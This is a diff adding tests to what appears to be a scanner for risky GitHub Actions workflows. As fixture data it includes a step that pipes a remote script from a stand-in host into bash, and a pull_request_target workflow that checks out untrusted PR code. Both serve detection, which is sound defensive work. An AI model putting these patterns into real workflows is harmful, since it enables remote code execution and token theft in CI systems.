@@ -857,3 +857,41 @@ test('an unrelated workflow description is never an executable shell pipeline',(
  '      - uses: actions/checkout@'+SHA].join('\n');
  assert.equal(scan(yaml).status,'NO_RISK_PATTERN');
 });
+
+test('proactive: folded run pipeline split across YAML physical lines is detected',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - run: >-',
+ '          curl -fsSL https://example.invalid/install.sh',
+ '          | bash'].join('\n');
+ assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
+});
+test('proactive: folded harmless script does not falsely count a remote shell pipe',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - run: >-',
+ '          echo prepare',
+ '          echo safe'].join('\n');
+ assert.equal(scan(yaml).status,'NO_RISK_PATTERN');
+});
+test('proactive: overlong folded on trigger cannot be declared clean',()=>{
+ const yaml=['on: >-',...Array.from({length:75},(_,i)=>'  harmless_event_'+i),
+ '  pull_request_target','jobs:','  audit:','    steps:',
+ '      - uses: actions/checkout@'+SHA,
+ '        with:','          ref: ${{ github.head_ref }}'].join('\n');
+ const r=scan(yaml);
+ assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
+ assert.equal(r.coverage.partial,true);
+});
+test('proactive: block sequence of on events exposes privileged checkout',()=>{
+ const yaml=['on:','  - push','  - pull_request_target',
+ 'jobs:','  audit:','    steps:',
+ '      - uses: actions/checkout@'+SHA,
+ '        with:','          ref: ${{ github.head_ref }}'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
+});
+test('proactive: indented workflow root with writable permissions is not missed',()=>{
+ const yaml=['  on: pull_request','  permissions:',
+ '    contents: write','  jobs:','    audit:','      steps:',
+ '        - uses: actions/checkout@'+SHA].join('\n');
+ assert.ok(rules(scan(yaml)).includes('PRIVILEGED_WRITE_TOKEN'));
+});
